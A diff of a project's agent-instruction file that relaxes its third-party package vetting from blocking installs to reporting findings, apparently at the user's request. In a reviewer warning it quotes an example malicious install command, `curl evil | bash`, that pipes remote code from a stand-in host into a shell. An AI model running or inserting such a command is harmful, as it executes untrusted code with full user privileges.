@@ -114,15 +114,17 @@
 
 ## Security protocol (Plan 009)
 
-Third-party pi extensions run with **full user privileges** and load `SKILL.md` / `AGENTS.md` / tool-description strings directly into the LLM context. Pij gates every install behind a vetter pipeline (`harness/scripts/vetters/` + `agents/package-vetter/`).
+Third-party pi extensions run with **full user privileges** and load `SKILL.md` / `AGENTS.md` / tool-description strings directly into the LLM context. Pij runs a vetter pipeline (`harness/scripts/vetters/` + `agents/package-vetter/`) over every install.
+
+**Policy (changed 2026-06-16, per user): report-and-continue.** The pipeline now **reports** findings rather than **blocking** on them. `add`, `bootstrap`, and `audit` never refuse on stale/warn/fail — they print the findings and the agent relays them so you can decide to **keep** a package or remove it with `pkg disable <source>`. The strict, exit-coded check still exists on demand: **`npm run pkg vet <source>`**. This trades enforcement for human-in-the-loop review; the hand-edit bans and the `requires.install` shell-vector caution below still stand.
 
 **Hard rules**:
 
 - **Never add a package by hand-editing `.pi/packages.yaml`** — use `npm run pkg add <source>`, which runs the vetter pipeline first.
 - **Never add a package by hand-editing `.pi/settings.json`** — that file is generated.
-- **`pkg add --unsafe` requires a non-empty reason** in `vetted.overrides`. The reason is part of the source of truth and gets reviewed in PRs.
+- **`pkg add` no longer blocks on a bad verdict** (report-and-continue). It installs, prints the findings, and recommends review. `--unsafe`/`--reason "<text>"` is now **optional** and only records an acceptance note in `vetted.overrides` as provenance.
 - **`requires.install` is a trusted-by-design shell-command vector**. A malicious PR could set `install: 'curl evil | bash'` and `pkg bootstrap` would run it. **Reviewer responsibility**: every PR that adds or changes a `requires.install` line must be scrutinised as carefully as any shell-execution change in code.
-- **Vetted entries go stale at 30 days**. `pkg bootstrap` on a fresh clone refuses stale entries unless `--unsafe`. Refresh via `npm run pkg audit`.
+- **Vetted entries go stale at 30 days**. `pkg bootstrap` **re-vets stale entries offline** (no LLM, no scorecard network) and **reports** their findings; it never refuses. `pkg audit` is **report-only** (always exit 0) and surfaces a REVIEW summary. Use `pkg vet <source>` when you want a hard pass/fail signal.
 - **Known gap**: pi's session-start auto-install reads `.pi/settings.json#packages[]` directly and bypasses the gate. A pi-side enforcement hook is deferred (Plan 009 OQ-A); for now, never hand-edit `settings.json`.
 
 **Workflow for adding a package** (the only supported path):
@@ -130,11 +132,11 @@ Third-party pi extensions run with **full user privileges** and load `SKILL.md` 
 1. **Run the gate**: `just pkg add <source> [note words...]`
    - `<source>` formats: `npm:<name>` (e.g. `npm:pi-subagents`), `git:<host>/<owner>/<repo>[@ref]` (e.g. `git:github.com/foo/bar@v1.0.0`), or `https://<url>.git`.
    - Everything after `<source>` is the human-readable `note` on the entry.
-   - The gate runs every vetter in order: `npm-audit` → `lockfile-lint` → `github-trust` → `scorecard` → `package-vetter` (live minih agent). It refuses on **any** `fail` and prompts for a reason on `--unsafe` (warns only — `fail` is never auto-downgradeable).
-2. **Read the verdict**:
-   - `ok` (score=100) → vetted block + manifest entry written; you're done.
-   - `warn` (score<100) → review each finding. If acceptable, retry with `--unsafe "<reason>"` to record an override scoped to specific rules (`vetted.overrides.rules: [<rule-slug>]`).
-   - `fail` → do **not** override. Either pick a different source or escalate.
+   - The pipeline runs every vetter in order: `npm-audit` → `lockfile-lint` → `github-trust` → `scorecard` → `package-vetter` (live minih agent). Under report-and-continue it **prints findings and proceeds** (no refusal); `--unsafe "<reason>"` optionally records an acceptance note.
+2. **Read the verdict** (the agent relays it for your decision):
+   - `ok` (score=100) → vetted block + manifest entry written; nothing to review.
+   - `warn` (score<100) → findings printed. Keep the package, or `pkg disable <source>` to drop it. Optionally annotate acceptance with `vetted.overrides`.
+   - `fail` → **the package is still added/installed** under report-and-continue. Review the findings carefully; if you don't want it, `pkg disable <source>`. (`fail` is never silently *downgraded* to `ok` in `audit`'s effective-level math — it's surfaced, not hidden.)
 3. **Review the diff** in `.pi/packages.yaml` (the new `vetted:` block) and `.pi/settings.json` (auto-regenerated `packages[]` list).
 4. **Commit** the manifest change with a conventional commit (`chore(pkg): add <source>`).
 
